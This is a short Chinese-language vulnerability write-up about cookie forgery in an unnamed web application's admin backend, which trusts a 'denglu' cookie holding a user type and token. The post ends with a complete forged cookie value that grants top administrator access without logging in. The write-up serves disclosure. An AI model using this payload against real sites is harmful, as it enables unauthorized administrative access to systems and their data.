****1.cookie伪造漏洞****

  

  

**后台界面是这样的，懂的都懂。**

  

**![](../Images/ead2b1d599b2d32ee08c9b2dcddd4d3b.png)**

  

**该程序在后台登录处用一个token和用户id来判断登录状态和用户身份**

  

**![](../Images/ac81fb7d31d41af0f17ae6e2121206b5.png)**

  

**![](../Images/4ecff56c37baa20be1ee2e3c543b9561.png)**

  

**![](../Images/39f21f364cc0b0d80394b31b889832f6.png)**

**![](../Images/8c20e4849a1b9ac32e454ceb16969957.png)**

**![](../Images/b40152d2aea0a242ddcd8f3af40a1c17.png)**

  

**只需要构造对应的cookie中的denglu 这个参数中的值就可以进入后台  otype是用于判断用户身份**

  

**![](../Images/cad6268c466168f39fad8d53de2e93f1.png)**

  

**在没修改源码的情况下最高管理员权限otype是3**

**因此只需要构造cookie就可以直接进入后台**

  

*   

```
`denglu=think:{"otype":"3","userid":"","username":"","token":"3c341b110c44ad9e7da4160e4f865b63"}`
```

  

**![](../Images/da209de0e4b4a45398ec3f87fdefae6e.png)**
